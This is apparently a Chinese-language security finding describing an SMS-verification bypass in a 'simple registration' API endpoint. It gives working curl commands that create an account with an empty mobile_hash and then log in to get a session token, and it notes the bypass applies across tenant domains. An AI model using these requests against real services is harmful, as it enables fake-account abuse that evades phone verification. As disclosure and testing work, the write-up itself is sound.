## 原理
后端提供两条注册链路：
- 正规链路：/api/user/regist（第一步，CheckVerifyCodeReq{mobile,smscode}，强制短信校验）→ /api/user/register（第二步，需 mobile_hash）
- 「简化注册」链路：/api/user/simple_regist，请求体同为 RegisterReq{account,pwd,mobile_hash,device_info,platform,reg_source_id,website,sex,anchor_id,invite_code}
  但实测**完全不校验 smscode / mobile_hash**（mobile_hash 传空字符串即通过），直接建号并返回登录态 token。

## 复现（curl 原文）
```bash
curl -k -s -X POST 'https://example.com/api/user/simple_regist' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Authorization: token=; uid=' \
  -H 'platform: 0' \
  -H 'device-info: lmdev-test01' \
  -H 'reg-source: UD70IUQQ' \
  -H 'lang: zh_cn' \
  -d '{"account":"18736257288","anchor_id":0,"device_info":"lmdev-test01","invite_code":"","mobile_hash":"","platform":0,"pwd":"abc12345","reg_source_id":"UD70IUQQ","sex":0,"website":"example.com"}'
# → {"status":0,"data":"<加密串>","msg":"SUCCESS"}
# data 用下方算法解密 → {"id":1358553,"token":"mDx86zVpBmXyRc0kqdJJycOPw/maKx2r",...}

curl -k -s -X POST 'https://example.com/api/user/login' \
  -H 'Content-Type: application/json;charset=UTF-8' -H 'device-info: lmdev-test01' -H 'reg-source: UD70IUQQ' \
  -H 'platform: 0' -H 'lang: zh_cn' \
  -d '{"account":"18736257288","pwd":"abc12345","platform":0,"login_type":1,"source_id":10001,"website":"example.com"}'
# → status 0 再次签发 token（密码登录可用）
```
后续请求头：`Authorization: token=<token>; uid=<uid>`

## 判定要点（避免误报）
- 对照证明短信校验确实存在：/api/user/readyForTakeOff {mobile,smscode} 任意码 → 「验证码错误」；/api/user/checkSmsCode 未登录 → LOGIN TIMEOUT；同手机号二次 simple_regist → 「帐号已存在」（说明走的是真实建号逻辑，不是空响应）
- 通用性：同一平台多租户共用该后端（reg-source 头按域名取码），换租户域名同样适用；镜像主机 target294.example.com 亦路由该接口